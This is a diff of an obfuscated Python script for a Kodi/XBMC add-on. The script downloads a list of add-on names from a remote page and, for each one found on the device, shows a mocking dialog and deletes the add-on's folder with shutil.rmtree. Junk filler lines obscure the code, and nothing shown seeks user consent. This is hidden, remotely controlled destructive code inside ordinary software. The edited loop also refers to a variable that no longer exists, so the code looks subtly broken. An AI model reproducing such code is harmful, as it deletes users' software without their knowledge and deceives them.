@@ -53,41 +53,42 @@ def O0oOO0o0 ( ) :
     else :
      if i111I != 'Failed' :
       Ii1IIii11 = re . compile ( '<li><a href="(.+?)">.+?</a></li>' ) . findall ( i111I )
-      for iiI1iIiI in Ii1IIii11 :
-       iiI1iIiI = ( str ( O0O ) ) + ( str ( iiI1iIiI ) ) . replace ( '.zip' , '' )
-       if os . path . exists ( xbmc . translatePath ( iiI1iIiI ) ) :
-        OOo ( iiI1iIiI )
+      for Oooo0000 in Ii1IIii11 :
+       Oooo0000 = 'special://home/addons/' + ( str ( iiI1iIiI ) ) . replace ( '.zip' , '' )
+       if os . path . exists ( xbmc . translatePath ( Oooo0000 ) ) :
+        OOo ( Oooo0000 )
        else :
         pass
-        if 55 - 55: i1111 - i1IIi11111i / I11i1i11i1I % ooIiII1I1i1i1ii / oOOOo0o0O + OOoOoo00oo
+        if 22 - 22: OOo000 . O0I11i1i11i1I
+        if 31 - 31: i11iI / Oo0o0ooO0oOOO + I1 - OOoOoo00oo - iiI11
 def Oo0oO0oo0oO00 ( url ) :
- iiI11 = urllib2 . Request ( url )
- iiI11 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
- OOooO = ''
+ OOooO = urllib2 . Request ( url )
+ OOooO . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
  OOoO00o = ''
+ II111iiii = ''
  try :
-  OOooO = urllib2 . urlopen ( iiI11 )
-  OOoO00o = OOooO . read ( )
-  OOooO . close ( )
+  OOoO00o = urllib2 . urlopen ( OOooO )
+  II111iiii = OOoO00o . read ( )
+  OOoO00o . close ( )
  except : pass
- if OOoO00o != '' :
-  return OOoO00o
+ if II111iiii != '' :
+  return II111iiii
  else :
-  OOoO00o = 'Failed'
-  return OOoO00o
-  if 9 - 9: I1iiiiI1iII - oOo0 / iIii1I11I1II1 % IiII
-  if 18 - 18: O0 - oOOOo0o0O / oOOOo0o0O + oOo0 % oOo0 - OOoOoo00oo
+  II111iiii = 'Failed'
+  return II111iiii
+  if 48 - 48: I1Ii . i11iIiiIii - Oo0o0ooO0oOOO % IiII . I1Ii / ooOoO0o
+  if 6 - 6: I1Ii111 * I1
 def OOo ( addon ) :
- O0O00Ooo = ( addon ) . replace ( 'special://home/addons/' , '' )
- o0OOO . create ( "[COLOR=white]This is growing old now[/COLOR]" , 'Unfortunately you have installed [COLORred]' + O0O00Ooo + '[/COLOR]' , 'It has been removed as is only there to fuel ego' , '[COLORyellow]USE OFFICIAL ADDONS AND SHOW RESPECT[/COLOR]' )
+ O00O0O0O0 = ( addon ) . replace ( 'special://home/addons/' , '' )
+ o0OOO . create ( "[COLOR=white]This is growing old now[/COLOR]" , 'Unfortunately you have installed [COLORred]' + O00O0O0O0 + '[/COLOR]' , 'It has been removed as is only there to fuel ego' , '[COLORyellow]USE OFFICIAL ADDONS AND SHOW RESPECT[/COLOR]' )
  xbmc . sleep ( 3000 )
  addon = xbmc . translatePath ( str ( addon ) )
  shutil . rmtree ( addon , ignore_errors = True )
  o0OOO . update ( 100 , "" , "Your Device is now clean" )
  xbmc . sleep ( 1000 )
  o0OOO . close ( )
- if 64 - 64: i1111 - O0 / ooOo / ooOoO0o / iIii1I11I1II1
- if 24 - 24: O0 % ooOoO0o + i1IIi + I1iiiiI1iII + o00O0oo
+ if 75 - 75: i1IIi / Oo0o0ooO0oOOO - ooOoO0o
+ if 63 - 63: ooOo . ooOo
 O0oOO0o0 ( )
-if 70 - 70: iII111i % iII111i . OOoOoo00oo % IiII * ooOoO0o % i1111
+if 32 - 32: i1IIi . i11iI % IiII . ooOoO0o
 # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3
